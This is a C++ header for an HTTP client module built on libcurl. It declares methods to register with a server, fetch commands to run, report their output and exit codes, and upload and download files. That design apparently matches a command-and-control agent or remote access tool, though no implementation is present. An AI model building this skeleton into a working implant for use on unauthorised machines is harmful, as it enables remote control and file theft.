/*module for easy interface with the server*/


#ifndef REQUESTS_H
#define REQUESTS_H
#include <stdio.h>
#include <string>
#include <vector>
#include <curl/curl.h>

#define SERVER_URL2 "https://example.com/"
#define SERVER_URL string("http://127.0.0.1:8080")
using namespace std;

struct commandReport{
    string response;
    int exitCode;
};

struct commandInput{
    vector<string> argv;
};

class simpleCurl{
    private:
        CURL *curl;
    public:
        simpleCurl();
        string simplePerform(const char * subpath,long *statusCode,
                            const char **headers,FILE *fp);
        CURL *getObject();
        ~simpleCurl();
};


class httpManager{
    private:
        //CURL *curl;
        string jwtToken;
        

    public:
        httpManager();
        ~httpManager();

        //writesResponse into string
        static size_t writeCallback(void *contents, size_t size, size_t nmemb, void *userp);
        static size_t writeCallbackFile(void *contents, size_t size, size_t nmemb, void *userp);

        //makes a get request to /register and sets jwt token
        bool makeRegister();

        //makes a get request to /getCmd and returns the comand
        commandInput getComand();

        //reports the result of a comand back to server
        void report(const char * report);

        //uploads specific file to /upload
        void upload(const char * fname);

        //downloads file from server and save it locally
        void download(const char *fname);
        
};


#endif